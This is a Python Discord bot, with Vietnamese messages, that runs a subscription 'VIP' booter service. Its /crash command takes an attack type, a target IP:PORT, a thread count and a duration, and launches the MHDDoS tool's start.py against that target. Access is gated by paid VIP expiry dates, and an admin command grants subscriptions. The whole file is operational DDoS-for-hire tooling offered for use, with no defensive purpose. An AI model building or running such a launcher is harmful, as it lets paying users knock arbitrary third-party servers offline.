import discord
from discord.ext import commands
from discord import app_commands
import sqlite3
from datetime import datetime, timedelta
import subprocess
import asyncio

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
ADMIN_ID = 7178876305
START_PY_PATH = "/workspaces/MHDDoS/start.py"

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

conn = sqlite3.connect("users.db")
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        discord_id INTEGER UNIQUE,
        expiration_date TEXT
    )
""")
conn.commit()

cooldowns = {}
active_attacks = {}

@bot.event
async def on_ready():
    await tree.sync()
    print(f"Bot {bot.user} đã sẵn sàng.")

# /start
@tree.command(name="start", description="Kiểm tra trạng thái VIP")
async def start(interaction: discord.Interaction):
    discord_id = interaction.user.id
    cursor.execute("SELECT expiration_date FROM vip_users WHERE discord_id = ?", (discord_id,))
    result = cursor.fetchone()

    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ Gói VIP của bạn đã hết hạn."
        else:
            days_left = (expiration_date - datetime.now()).days
            vip_status = f"✅ Bạn là VIP! Còn {days_left} ngày. Hết hạn: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
    else:
        vip_status = "❌ Bạn không có gói VIP nào."

    await interaction.response.send_message(vip_status, ephemeral=True)

# /vip <id> <days>
@tree.command(name="vip", description="Thêm người dùng VIP (ADMIN)")
@app_commands.describe(user_id="ID người dùng Discord", days="Số ngày VIP")
async def vip(interaction: discord.Interaction, user_id: str, days: int):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message("❌ Bạn không có quyền sử dụng lệnh này.", ephemeral=True)
        return

    expiration = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("""
        INSERT OR REPLACE INTO vip_users (discord_id, expiration_date)
        VALUES (?, ?)
    """, (int(user_id), expiration))
    conn.commit()

    await interaction.response.send_message(f"✅ Đã cấp VIP cho ID `{user_id}` trong {days} ngày.")

# /crash <type> <ip_port> <threads> <ms>
@tree.command(name="crash", description="Gửi lệnh tấn công")
@app_commands.describe(
    attack_type="Loại tấn công (VD: UDP)",
    ip_port="IP:PORT",
    threads="Số threads",
    duration="Thời gian (ms)"
)
async def crash(interaction: discord.Interaction, attack_type: str, ip_port: str, threads: str, duration: str):
    discord_id = interaction.user.id

    cursor.execute("SELECT expiration_date FROM vip_users WHERE discord_id = ?", (discord_id,))
    result = cursor.fetchone()
    if not result:
        await interaction.response.send_message("❌ Bạn không có quyền sử dụng lệnh này.", ephemeral=True)
        return

    expiration = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration:
        await interaction.response.send_message("❌ Gói VIP của bạn đã hết hạn.", ephemeral=True)
        return

    if discord_id in cooldowns and (asyncio.get_event_loop().time() - cooldowns[discord_id]) < 10:
        await interaction.response.send_message("❌ Vui lòng chờ 10 giây trước khi tiếp tục.", ephemeral=True)
        return

    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
    process = subprocess.Popen(command)
    active_attacks[discord_id] = process
    cooldowns[discord_id] = asyncio.get_event_loop().time()

    stop_button = discord.ui.Button(label="⛔ Dừng Tấn Công", style=discord.ButtonStyle.danger)
    
    async def stop_callback(interaction2: discord.Interaction):
        if discord_id != interaction2.user.id:
            await interaction2.response.send_message("❌ Chỉ người gửi lệnh mới có thể dừng.", ephemeral=True)
            return
        if discord_id in active_attacks:
            active_attacks[discord_id].terminate()
            del active_attacks[discord_id]
            await interaction2.response.edit_message(content="⛔ Tấn công đã bị dừng.", view=None)

    stop_button.callback = stop_callback
    view = discord.ui.View()
    view.add_item(stop_button)

    await interaction.response.send_message(
        f"""✅ **TẤN CÔNG KHỞI CHẠY**  
**IP:PORT**: `{ip_port}`  
**Kiểu**: `{attack_type}`  
**Threads**: `{threads}`  
**Thời gian**: `{duration}ms`""",
        view=view
    )

bot.run(TOKEN)